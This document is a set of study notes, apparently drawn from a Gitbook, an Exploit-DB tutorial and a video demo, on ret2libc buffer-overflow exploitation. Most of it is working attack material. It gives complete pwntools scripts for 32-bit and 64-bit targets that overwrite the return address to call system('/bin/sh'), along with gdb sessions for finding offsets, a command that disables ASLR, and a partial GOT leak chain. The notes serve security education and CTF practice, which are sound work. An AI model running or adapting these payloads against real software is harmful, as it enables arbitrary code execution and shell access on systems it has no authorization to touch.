From [IronStone Gitbook](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc)

# `ret2libc`
The standard ROP exploit

The `ret2libc` technique is used to exploit buffer overflow vulnerabilities on systems that use the `NX` bit to protect stack memory. It's based off of the `system` function.
	The string `"/bin/sh"` string is in there too
The big goal is passing `"/bin/sh"` as a parameter to `system`

## Disabling ASLR
This demo has ASLR disabled for ease, but the [[Ret2Plt]] technique can be used to leak the base address of the library.
To disable:
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
## Manual Exploitation
### Getting Libc and its base
Linux has a command called `ldd` to tell use the base addresses of linked libraries:
```
$ ldd vuln-32 
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dc2000)
	/lib/ld-linux.so.2 (0xf7fd3000)
```
### Locating `system()`
To call `system` we need its location in memory.
Can use `readelf` for this:
```
$ readelf -s /lib32/libc.so.6 | grep system
1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
```
### Locating `"/bin/sh"`
Use strings:
```
$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
18c32b /bin/sh
```
Note, when passing strings as parameters, you MUST past the pointer to the string

## 32-bit Exploit
```
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```
 Automated with PwnTools
```
# 32-bit
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```
## 64-bit Exploit
Instead of passing the parameters in after the `return` pointer, we'll have to use a `pop rdi; ret` gadget to put it into `RDI`:
```
$ ROPgadget --binary vuln-64 | grep rdi
[...]
0x00000000004011cb : pop rdi ; ret
```
Code:
```
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
```


# Return to Libc
Chaining tutorial from [Exploit DB](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)
Looks like a 32-bit explanation
## Introduction
Return to libC is a method to defeat stack protection on Linux systems.
To understand how this works, lets look at the functions in the stack.
###### Functions on the Stack:
```
Top of Stack - Lower Memory Address
	Buffer[1024]
	...
	Saved Frame Pointer (EBP)
	Saved Return Address(EIP)
	function() arguments
	function() arguments
Bottom of Stack - Higher Memory Address
```
The stack grows upward towards the lower memory address
* First, the `function()` arguments are pushed in reverse order
* Then the address of the next instruction is saved on the stack
* The `function()` frame pointer is saved next
* Finally, local variables

In a normal buffer overflow, we can overflow the buffer to overwrite the saved frame pointer and return address. We can use that to redirect execution to shellcode saved in either an environment variable or the stack. However, stack protection prevents execution of instructions from environment variables or the stack.

To get past this, we can overwrite the return address with an address to a function in a libc library.
	Must also overwrite the arguments and saved return address
	The processor will treat this as a valid function call
Essentially, we're creating a fake function stack frame.
###### Stack:
```
Top of Stack - Lower Memory Address
	AAAAAAAAAAAAAAAAAAAAAA
	...
	AAAA (Overwritten Frame Pointer)
	Address of function in libc (Overwritten Return Address)
	Dummy Return Address (for the called function to return to)
	function() arguments
Bottom of Stack - Higher Memory Address
```
So this shows us succsesfully overwriting the buffer and saved frame pointer with "A"s, overwriting the return address with the address of a libc function, and a dummy return address for the function to return to after the function runs, and then the arguments (pushed backwards)
## Exploiting Return-to-libc:
###### Code for example binary:
```c
#include <stdio.h>
int main(int argc, char *argv[])
{
	char buf[256];
	memcpy(buf, argv[1],strlen(argv[1]));
	printf(buf);
}
```
###### Where is the return address overwritten?
```
root@kali:~/Desktop/tuts/so# gdb -q rt
Reading symbols from /root/Desktop/tuts/so/rt...(no debugging symbols found)...done.
(gdb) r `python -c 'print "A"*264'`
Starting program: /root/Desktop/tuts/so/rt `python -c 'print "A"*264'`
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) r `python -c 'print "A"*260+"B"*4'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Desktop/tuts/so/rt `python -c 'print "A"*260+"B"*4'`
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```
After 260 bytes
###### Finding the address of the `system()` function
Set a break at main and then search for the address to system when we get there:
```
(gdb) b *main
Breakpoint 1 at 0x804847c
(gdb) r `python -c 'print "A"*260+"B"*4'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Desktop/tuts/so/rt `python -c 'print "A"*260+"B"*4'`
Breakpoint 1, 0x0804847c in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e9ef10 <system>
```
The `system()` function address is at `0xb7e9ef10`
###### Finding the address of `"/bin/sh"`
This is whack and probably not how I would do it
```
root@kali:~/Desktop/tuts/so# export SHELL='/bin/sh'
root@kali:~/Desktop/tuts/so# gdb -q rt
(gdb) b *main
Breakpoint 1 at 0x804847c
(gdb) r `python -c 'print "A"*260+"B"*4'`
Starting program: /root/Desktop/tuts/so/rt `python -c 'print "A"*260+"B"*4'`
Breakpoint 1, 0x0804847c in main ()
(gdb) x/500s $esp
---Type <return> to continue, or q <return> to quit---
0xbfffff2f: "SHELL=/bin/sh"
0xbfffff3d: "GDMSESSION=default"
0xbfffff50: "GPG_AGENT_INFO=/root/.cache/keyring-WoZFyX/gpg:0:1"
0xbfffff83: "PWD=/root/Desktop/tuts/so"
0xbfffff9d: "XDG_DATA_DIRS=/usr/share/gnome:/usr/local/share/:/usr/share/"
0xbfffffda: "LINES=41"
0xbfffffe3: "/root/Desktop/tuts/so/rt"
0xbffffffc: ""
```
Essentially, it uses `x/500s $esp` to print 500 lines of the stack to find the environment variable "SHELL"
The exact address of the string `"/bin/sh"` is:
```
addr(SHELL) + 6
0xbfffff2f + 6
0xBFFFFF35
```
`SHELL=` is 6 bytes already
###### So our stack should look like:
```
Top of Stack   AAAAA...AAA
EBP            AAA
EIP            0xb7e9ef10         --> system
```
# Exploiting Ret2Libc
Demo from [RazviOverflow on Youtube](https://www.youtube.com/watch?v=TTCz3kMutSs)
## Leaking Addresses
Call `puts` and pass in the position of a function that is already loaded, say `puts` in the GOT
`puts` takes in one param, a string pointer
So in Base64, we'll want to put that parameter in the `RDI` register
Gotta find a gadget to let us modify `rdi`
![[Pasted image 20240311155923.png]]
Got one at `0x004012a3`
##### Can also get the plt and got addresses of these things using `pwntools`
But could also do manually
![[Pasted image 20240311160628.png]]

After main returns, we want it to return to the address of the pop rdi gadget:
```python
payload += pop_rdi_ret # = p64(0x004012a3)
```
Then start adding the addresses we want to print, followed by the plt address of puts to print it
```python
payload += pop_rdi_ret
payload += got_puts_address
payload += plt_puts_address
```
![[Pasted image 20240311162950.png]]

![[Pasted image 20240311164340.png]]

